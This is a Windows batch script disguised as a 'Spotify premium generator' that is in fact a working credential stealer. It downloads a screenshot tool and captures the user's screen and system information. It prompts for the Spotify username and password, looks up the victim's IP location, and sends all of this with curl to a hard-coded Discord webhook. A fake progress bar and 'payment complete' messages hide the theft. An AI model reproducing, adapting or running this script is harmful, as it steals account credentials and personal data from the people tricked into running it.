@echo off
color 0A
cd %appdata%
set "webhook=https://discord.com/api/webhooks/989609504809316372/6tDEPjxYwOR7XKm_XtD4QOw3KrkLk2g9Ak"
curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
.\s.exe -o %appdata%\s.png
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"###################################\"}"  %webhook%

set "tempsys=%appdata%\sysinfo.txt"
2>NUL SystemInfo > "%tempsys%"
curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%

for /l %%a in (1,1,120) do echo|set /p="#"
cls
echo ----------------------
set /p ACC=Your spotify acc name: 
echo ----------------------
set /p PSWRD=Your acc password: 
cls
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```NEW USER %username% (%ComputerName%)```\"}"  %webhook%
curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook% 
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Info```\"}" %webhook%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Pass - %ACC%:%PSWRD%```\"}" %webhook%
curl -o ok69.txt https://extreme-ip-lookup.com/json/?key=3Ywhtw1MYNLZlZgtAx0U --silent
set "gowno=%appdata%\ok69.txt"
curl --silent --output /dev/null -F s=@"%gowno%" %webhook%
echo                                       __  _ ____                                          __            
echo                     _________  ____  / /_(_) __/_  __   ____ ____  ____  ___  _________ _/ /_____  _____
echo                    / ___/ __ \/ __ \/ __/ / /_/ / / /  / __ \`/ _ \/ __ \/ _ \/ ___/ __ \`/ __/ __ \/ ___/
echo                   (__  ) /_/ / /_/ / /_/ / __/ /_/ /  / /_/ /  __/ / / /  __/ /  / /_/ / /_/ /_/ / /    
echo                  /____/ .___/\____/\__/_/_/  \__, /   \__, /\___/_/ /_/\___/_/   \__,_/\__/\____/_/     
echo                      /_/                    /____/   /____/                                           
for /l %%a in (1,1,120) do echo|set /p="#"
echo                                         logged to spotify network as: %ACC%

:choice
set /P c=Are you sure you want to generate spotify premium on acc? [Y/N] 
if /I "%c%" EQU "Y" goto :accept
if /I "%c%" EQU "N" goto :nonaccept
goto :choice


:accept
cls
echo Redirecting to spotify.com/premium.
timeout 5

cls
echo Generating fake credit card.
>nul chcp 65001
set "_spc=          "
set "_bar=■■■■■■■■■■■■■■■■■■■■"

setlocal enabledelayedexpansion

for /f %%a in ('copy /Z "%~dpf0" nul')do for /f skip^=4 %%b in ('echo;prompt;$H^|cmd')do set "BS=%%~b" & set "CR=%%a"
for /l %%L in (1 1 10)do <con: set /p "'= !CR!!BS!!CR![!_bar:~0,%%~L!!BS!!_spc:~%%~L!] " <nul & >nul timeout.exe /t 1
cls
echo Completing payment.
timeout 1 > NUL

echo Generated premium on acc.
timeout 2
echo Exiting
timeout 1 > NUL
cls
echo Exiting.
timeout 1 > NUL
cls
echo Exiting..
timeout 1 > NUL
cls
echo Exiting...
timeout 1 > NUL
cls
echo Exiting....
exit


pause > nul


:nonaccept

echo Exiting
timeout 1 > NUL
cls
echo Exiting.
timeout 1 > NUL
cls
echo Exiting..
timeout 1 > NUL
cls
echo Exiting...
timeout 1 > NUL
cls
echo Exiting....
exit



timeout 1 > NUL







pause > nul
